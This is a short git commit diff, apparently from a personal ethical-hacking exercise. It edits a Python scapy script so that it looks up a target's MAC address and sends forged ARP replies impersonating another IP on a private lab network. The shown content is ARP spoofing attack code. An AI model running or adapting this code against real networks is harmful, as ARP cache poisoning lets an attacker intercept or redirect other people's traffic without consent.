6a5edb56bffb0def3eb8b9f6fac4a5f7f86b07bc
mikestromme <mikestromme@gmail.com>
2022-03-08 12:50:55 +0000

    stuff

--- arp_spoof/arp_spoof.py
+++ arp_spoof/arp_spoof.py
@@ -9,11 +9,12 @@ def get_mac(ip):
     # arp_request_broadcast.show()
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
 
-    print(answered_list[0][1].hwsrc)
+    return answered_list[0][1].hwsrc
 
 
 def spoof(target_ip, spoof_ip):
-    packet = scapy.ARP(op=2,pdst=target_ip,hwdst="00:0c:29:30:5f:75", psrc=spoof_ip) # op=2 is response
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac, psrc=spoof_ip) # op=2 is response
     scapy.send(packet)
 
 get_mac("192.168.198.2")
